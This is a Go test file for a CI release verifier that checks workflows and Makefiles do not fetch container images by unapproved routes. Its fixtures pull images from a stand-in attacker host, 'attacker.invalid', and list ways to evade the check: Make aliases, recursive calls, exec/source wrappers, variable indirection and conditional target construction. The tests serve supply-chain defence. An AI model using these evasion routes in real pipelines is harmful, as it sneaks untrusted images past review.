package releaseverify

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestVerifyCIContainerDownloadsRejectsProtectedPlaywrightWorkflowRoutes(t *testing.T) {
	for _, target := range []string{"fe-visual", "fe-visual-update", "e2e", "e2e-update", "tuner-e2e"} {
		t.Run(target, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: extra\non: push\njobs:\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make " + target + " PW_DOCKER_USER=--pull=always\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a protected Playwright workflow route")
			}
		})
	}
	t.Run("reverse dependency alias", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		frontendPath := filepath.Join(root, "mk", "frontend.mk")
		writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\nplaywright-alias: e2e\n")
		workflow := "name: extra\non: push\njobs:\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: PW_DOCKER_USER=--pull=always make playwright-alias\n"
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted a workflow alias to a protected Playwright target")
		}
	})
	t.Run("recursive recipe alias", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		frontendPath := filepath.Join(root, "mk", "frontend.mk")
		writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\nplaywright-recipe-alias:\n\t$(MAKE) e2e\n")
		workflow := "name: extra\non: push\njobs:\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make playwright-recipe-alias\n"
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted a recursive Make alias to a protected Playwright target")
		}
	})
	t.Run("runner recipe alias", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		frontendPath := filepath.Join(root, "mk", "frontend.mk")
		writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\nplaywright-runner-alias:\n\t./scripts/run-playwright-container.sh e2e\n")
		workflow := "name: extra\non: push\njobs:\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make playwright-runner-alias\n"
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted a Make alias to the Playwright runner")
		}
	})
	t.Run("direct runner", func(t *testing.T) {
		root := writeCIContainerDownloadsFixture(t)
		workflow := "name: extra\non: push\njobs:\n  extra:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./scripts/run-playwright-container.sh e2e\n"
		writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
		if err := VerifyCIContainerDownloads(root); err == nil {
			t.Fatal("VerifyCIContainerDownloads accepted a direct workflow invocation of the Playwright runner")
		}
	})
	for name, command := range map[string]string{
		"owned visual route with override":        playwrightVisualWorkflowStep + " PW_DOCKER_USER=--pull=always",
		"owned e2e route with recursive override": "ACQUIRE=--pull=always make e2e 'PW_DOCKER_USER=$(ACQUIRE)'",
	} {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := "name: CI / Playwright\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + command + "\n"
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", playwrightWorkflowName), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an overridden owned Playwright route")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsArbitraryAcquisitionMakeRoutes(t *testing.T) {
	tests := map[string]string{
		"bounded helper with attacker image": `acquire-image:
	./scripts/ensure-container-image.sh attacker.invalid/image:pinned
`,
		"silent bounded helper": `acquire-image:
	@./scripts/ensure-container-image.sh attacker.invalid/image:pinned
`,
		"direct Docker pull": `acquire-image:
	docker pull attacker.invalid/image:pinned
`,
		"Docker image pull": `acquire-image:
	docker image pull attacker.invalid/image:pinned
`,
		"ignored Docker image pull": `acquire-image:
	-docker image pull attacker.invalid/image:pinned
`,
		"Podman container run": `acquire-image:
	podman container run attacker.invalid/image:pinned
`,
		"nerdctl container create": `acquire-image:
	nerdctl container create attacker.invalid/image:pinned
`,
		"Compose up": `acquire-image:
	docker compose up attacker
`,
		"variable engine": `acquire-image:
	"$${CONTAINER_ENGINE}" image pull attacker.invalid/image:pinned
`,
		"prerequisite alias": `acquire-image:
	docker pull attacker.invalid/image:pinned
acquire-alias: acquire-image
`,
		"recursive Make alias": `acquire-image:
	docker pull attacker.invalid/image:pinned
acquire-alias:
	$(MAKE) acquire-image
`,
		"forced recursive Make alias": `acquire-image:
	docker pull attacker.invalid/image:pinned
acquire-alias:
	+$(MAKE) acquire-image
`,
		"nested reverse closure": `acquire-image:
	./scripts/ensure-container-image.sh attacker.invalid/image:pinned
acquire-middle: acquire-image
acquire-alias:
	$(MAKE) acquire-middle
`,
	}
	for name, makeSource := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\n"+makeSource)
			target := "acquire-image"
			if strings.Contains(makeSource, "acquire-alias") {
				target = "acquire-alias"
			}
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: make `+target+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an arbitrary acquisition-bearing Make route")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsInlineAcquisitionMakeRoutes(t *testing.T) {
	tests := map[string]string{
		"direct pull":        `acquire-inline: ; docker pull attacker.invalid/image:pinned`,
		"helper":             `acquire-inline: ; ./scripts/ensure-container-image.sh attacker.invalid/image:pinned`,
		"runner":             `acquire-inline: ; ./scripts/run-playwright-container.sh e2e`,
		"prerequisite alias": "acquire-inline: ; docker pull attacker.invalid/image:pinned\nacquire-alias: acquire-inline",
	}
	for name, makeSource := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\n"+makeSource+"\n")
			target := "acquire-inline"
			if strings.Contains(makeSource, "acquire-alias") {
				target = "acquire-alias"
			}
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: make `+target+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an inline acquisition-bearing Make route")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsMakeEngineIndirection(t *testing.T) {
	tests := map[string]string{
		"assigned parenthesized variable": "ENGINE := docker\nacquire-variable:\n\t$(ENGINE) pull attacker.invalid/image:pinned\n",
		"assigned braced variable":        "ENGINE := docker\nacquire-variable:\n\t${ENGINE} image pull attacker.invalid/image:pinned\n",
		"recursively assigned variable":   "BASE_ENGINE := docker\nENGINE := $(BASE_ENGINE)\nacquire-variable:\n\t\"$(ENGINE)\" pull attacker.invalid/image:pinned\n",
		"unresolved executable":           "acquire-variable:\n\t$(ENGINE) pull attacker.invalid/image:pinned\n",
	}
	for name, makeSource := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			writeFixtureFile(t, frontendPath, readFixtureFile(t, frontendPath)+"\n"+makeSource)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: make acquire-variable
`)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted Make-variable container-engine indirection")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsWorkflowTargetIndirection(t *testing.T) {
	commands := map[string]string{
		"quoted variable":      `TARGET=test-pg; make "$TARGET"`,
		"braced variable":      `TARGET=test-pg; make "${TARGET}"`,
		"constructed variable": `PREFIX=test; TARGET="${PREFIX}-pg"; make "$TARGET"`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: `+command+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an unresolved workflow Make target")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsInheritedWorkflowExecutableAliases(t *testing.T) {
	tests := map[string]string{
		"workflow Make alias": `name: extra
on: push
env: {MAKE_BIN: /usr/bin/make}
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: |
          "$MAKE_BIN" dev
`,
		"job braced Make alias": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    env:
      BUILD_TOOL: /usr/bin/make
    steps:
      - run: |
          "${BUILD_TOOL}" dev
`,
		"step Playwright alias": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: |
          "$RUNNER" e2e
        env:
          RUNNER: ./scripts/run-playwright-container.sh
`,
		"step braced helper alias": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: |
          "${ACQUIRE_TOOL}" attacker.invalid/image:pinned
        env:
          ACQUIRE_TOOL: ./scripts/ensure-container-image.sh
`,
	}
	for name, workflow := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			buildPath := filepath.Join(root, "mk", "build.mk")
			writeFixtureFile(t, buildPath, ".PHONY: dev\ndev:\n\tdocker compose up app\n")
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an inherited workflow executable alias")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsWrappedOrConstructedWorkflowRoutes(t *testing.T) {
	tests := map[string]string{
		"exec Postgres Make": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: exec make test-pg
`,
		"exec Compose Make": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: exec make dev
`,
		"source Playwright runner from environment": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    env:
      RUNNER: ./scripts/run-playwright-container.sh
    steps:
      - run: source "$RUNNER" e2e
`,
		"dot image helper from environment": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: . "$HELPER" attacker.invalid/image:pinned
        env:
          HELPER: ./scripts/ensure-container-image.sh
`,
		"quoted multiline substitution before Make": `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: |
          note="$(
            printf x
          )"
          make dev
`,
	}
	for name, workflow := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			buildPath := filepath.Join(root, "mk", "build.mk")
			writeFixtureFile(t, buildPath, ".PHONY: dev\ndev:\n\tdocker compose up app\n")
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a wrapped or constructed workflow route")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsConditionalTargetConstruction(t *testing.T) {
	commands := map[string]string{
		"skipped OR assignment":       `TARGET=dev; true || TARGET=help; make "$TARGET"`,
		"skipped AND assignment":      `TARGET=dev; false && TARGET=help; make "$TARGET"`,
		"reverse OR assignment":       `TARGET=help; false || TARGET=dev; make "$TARGET"`,
		"reverse AND assignment":      `TARGET=help; true && TARGET=dev; make "$TARGET"`,
		"multiline control operators": "TARGET=dev\ntrue || TARGET=help\nmake \"$TARGET\"",
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			buildPath := filepath.Join(root, "mk", "build.mk")
			writeFixtureFile(t, buildPath, ".PHONY: dev\ndev:\n\tdocker compose up app\n")
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/build.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), `name: extra
on: push
jobs:
  acquire:
    runs-on: ubuntu-latest
    steps:
      - run: |
          `+strings.ReplaceAll(command, "\n", "\n          ")+"\n")
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a conditionally constructed Make target")
			}
		})
	}
}
